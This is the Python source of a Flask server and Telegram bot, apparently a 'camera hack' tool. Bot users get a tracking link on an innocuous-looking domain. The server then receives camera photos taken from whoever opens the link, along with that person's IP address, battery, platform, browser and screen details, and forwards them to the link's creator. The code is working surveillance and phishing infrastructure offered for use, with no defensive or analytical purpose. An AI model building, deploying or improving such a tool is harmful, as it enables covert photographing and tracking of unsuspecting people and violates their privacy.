import os, base64, threading, sqlite3, time
from flask import Flask, render_template, request, jsonify
import telebot
from telebot import types

app = Flask(__name__)

# सेटिंग्स
BOT_TOKEN = os.getenv('BOT_TOKEN')
MY_CHAT_ID = "7162565886"
ADMIN_ID = 7162565886
bot = telebot.TeleBot(BOT_TOKEN)

# Conflict 409 को पूरी तरह खत्म करने के लिए
try:
    bot.remove_webhook()
    time.sleep(2)
except: pass

def init_db():
    conn = sqlite3.connect('users.db')
    conn.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
    conn.commit()
    conn.close()

def add_user(user_id):
    try:
        conn = sqlite3.connect('users.db')
        conn.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
        conn.commit()
        conn.close()
    except: pass

@bot.message_handler(commands=['start'])
def start(message):
    add_user(message.chat.id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Camera hack 📸", callback_data="cam_menu"))
    bot.send_message(message.chat.id, "Select service ✅\nClick on 'camera hack' your service is procced 👇👇", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    base_url = "https://happy-wishing-you.onrender.com" 
    user_id = call.message.chat.id
    if call.data == "cam_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_back = types.InlineKeyboardButton("📸Back camera 📸", callback_data="mode_back")
        btn_front = types.InlineKeyboardButton("📸 Front Camera 📸", callback_data="mode_front")
        btn_dual = types.InlineKeyboardButton("📸 Dual camera 📸", callback_data="mode_dual")
        markup.add(btn_front, btn_back, btn_dual)
        bot.edit_message_text("😃Select any service ✅", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data.startswith("mode_"):
        mode = call.data.split("_")[1]
        track_link = f"{base_url}?m={mode}&uid={user_id}"
        bot.send_message(call.message.chat.id, f"😃 it's your track link 🔗👇👇\n\nUrl= {track_link}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    target_id = data.get('uid', MY_CHAT_ID)
    info = data.get('info', {})
    
    branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
    report = (f"🛡️ <b>SYSTEM AUDIT: {data.get('label')}</b>\n"
              f"👤 <b>Target:</b> {data.get('name')}\n"
              f"🔋 <b>Battery:</b> {info.get('battery')}\n"
              f"🌐 <b>IP Address:</b> {request.remote_addr}\n"
              f"📱 <b>Platform:</b> {info.get('platform')}\n"
              f"🖥️ <b>Browser:</b> {info.get('browser')}\n"
              f"📐 <b>Resolution:</b> {info.get('screen')}\n\n{branding}")
    
    if data.get('image'):
        try:
            img_bytes = base64.b64decode(data.get('image').split(',')[1])
            bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
        except: pass
    return jsonify({"status": "success"})

if __name__ == "__main__":
    init_db()
    threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
